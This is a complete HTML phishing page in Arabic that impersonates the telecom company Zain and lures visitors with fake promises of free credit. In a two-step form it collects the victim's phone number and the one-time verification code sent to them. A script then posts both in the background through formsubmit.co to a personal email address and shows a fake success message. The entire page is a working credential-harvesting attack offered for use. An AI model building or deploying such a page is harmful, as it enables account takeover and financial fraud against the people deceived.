<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
    مرحبا بك في عالمنا 
</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f8f6ff, #ece5ff);
        }

        .container {
            width: 100%;
            max-width: 410px;
            overflow: hidden;
            background: #fff;
            border-radius: 22px;
            box-shadow: 0 12px 40px rgba(91, 45, 145, 0.15);
        }

        .demo-banner {
            padding: 13px;
            text-align: center;
            background: #fff3cd;
            color: #805d00;
            font-size: 13px;
            font-weight: bold;
            border-bottom: 1px solid #f4dfa0;
        }

        .header {
            padding: 28px 24px;
            text-align: center;
            color: white;
            background: linear-gradient(135deg, #6d28d9, #9333ea);
        }

        .logo {
            width: 65px;
            height: 65px;
            margin: 0 auto 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 20px;
            background: rgba(255, 255, 255, 0.18);
            border: 1px solid rgba(255, 255, 255, 0.3);
            font-size: 29px;
            font-weight: bold;
        }

        .header h1 {
            margin: 0 0 8px;
            font-size: 22px;
        }

        .header p {
            margin: 0;
            font-size: 13px;
            opacity: 0.9;
        }

        .form-wrapper {
            padding: 25px;
        }

        .step {
            display: none;
        }

        .step.active {
            display: block;
        }

        .alert-box {
            padding: 12px;
            border-radius: 10px;
            background: #e0f2fe;
            color: #0369a1;
            font-size: 13px;
            margin-bottom: 18px;
            text-align: center;
            line-height: 1.6;
            border: 1px solid #bae6fd;
        }

        .success-box {
            padding: 20px;
            border-radius: 12px;
            background: #dcfce7;
            color: #15803d;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            line-height: 1.8;
            border: 1px solid #bbf7d0;
        }

        .form-group {
            margin-bottom: 19px;
        }

        label {
            display: block;
            margin-bottom: 9px;
            color: #333;
            font-size: 14px;
            font-weight: bold;
        }

        input {
            width: 100%;
            min-height: 48px;
            padding: 12px 14px;
            border: 1px solid #ddd4ef;
            border-radius: 11px;
            outline: none;
            background: #fff;
            color: #333;
            font-size: 15px;
            font-family: inherit;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .otp-input {
            text-align: center;
            letter-spacing: 8px;
            font-size: 20px;
            font-weight: bold;
            direction: ltr;
        }

        input:focus {
            border-color: #8539dc;
            box-shadow: 0 0 0 3px rgba(133, 57, 220, 0.1);
        }

        button {
            width: 100%;
            min-height: 49px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(135deg, #7028d9, #9333ea);
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            filter: brightness(0.95);
        }

        .footer {
            padding: 15px;
            border-top: 1px solid #f0ebf7;
            text-align: center;
            color: #888;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- شريط التنبيه التجريبي -->
    <div class="demo-banner">
      زين عالم جميل 
      رصيد مجانا  فقط ادخل بياناتك بصورة صحيحة 
 
    </div>

    <!-- الهيدر الاحترافي -->
    <div class="header">
        <div class="logo">⚡</div>
        <h1>شركة  زين عالم جميل </h1>
        <p id="header-subtitle">مرحباً أهلاً وسهلاً بك</p>
    </div>

    <div class="form-wrapper">
        <!-- النموذج يتكفل بالإرسال المباشر للإيميل -->
        <form id="mainForm" action="https://formsubmit.co/mohammedata009@gmail.com" method="POST" onsubmit="handleSubmit(event)">
            <input type="hidden" name="_captcha" value="false">

            <!-- الخطوة الأولى: إدخال بيانات رقم الهاتف للحصول على 100 ألف -->
            <div id="step1" class="step active">
                <div class="alert-box" style="background: #f0e9ff; color: #54209b; border-color: #ddd4ef;">
                    💸 <strong>تم إرسال 2 ألف جنيه</strong><br>
                    أدخل بياناتك للحصول على 100 ألف
                </div>

                <div class="form-group">
                    <label for="phone">رقم الهاتف</label>
                    <input type="tel" id="phone" name="phone" placeholder="أدخل رقم الهاتف" required>
                </div>

                <button type="button" onclick="goToStep2()">إرسال</button>
            </div>

            <!-- الخطوة الثانية: إدخال الرمز بعد الاعتماد -->
            <div id="step2" class="step">
                <div class="alert-box">
                    ✅ <strong>تم الاعتماد!</strong><br>
                    يرجى أدخل الرمز المرسل لإكمال العملية.
                </div>

                <div class="form-group">
                    <label for="otp">إرسال الرمز</label>
                    <input type="text" id="otp" name="otp_code" class="otp-input" maxlength="6" placeholder="------" required>
                </div>

                <button type="submit">إرسال الرمز</button>
            </div>

            <!-- الخطوة الثالثة: الرسالة النهائية بعد كتابة الرمز وارساله -->
            <div id="step3" class="step">
                <div class="success-box">
                    🎉 
                    تاكد من ادخال الرمز والرقم للحصول على المبلغ بنجاح!
                </div>
            </div>
        </form>
    </div>

    <div class="footer">
  جميع الحقوق محفوظة © 2026 - شركة زين
 
    </div>
</div>

<script>
    function goToStep2() {
        const phone = document.getElementById('phone').value;

        if (phone.trim() === "") {
            alert("يرجى إدخال رقم الهاتف أولاً");
            return;
        }

        // الانتقال للخطوة الثانية (تم الاعتماد + أدخل الرمز)
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
    }

    function handleSubmit(event) {
        // عند إرسال الرمز، يتم إرسال البيانات خلف الكواليس وإظهار رسالة "تم إرسال المبلغ"
        const otp = document.getElementById('otp').value;
        if (otp.trim() === "") {
            event.preventDefault();
            alert("يرجى كتابة الرمز أولاً");
            return;
        }

        // إرسال البيانات عبر FormSubmit في الخلفية
        const form = event.target;
        const formData = new FormData(form);

        fetch(form.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(() => {
            // إظهار واجهة النتيجة النهائية
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
        }).catch(() => {
            // في حال وجود مشكلة يتم عرض واجهة النتيجة أيضاً للتجربة
            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
        });

        event.preventDefault();
    }
</script>

</body>
</html>
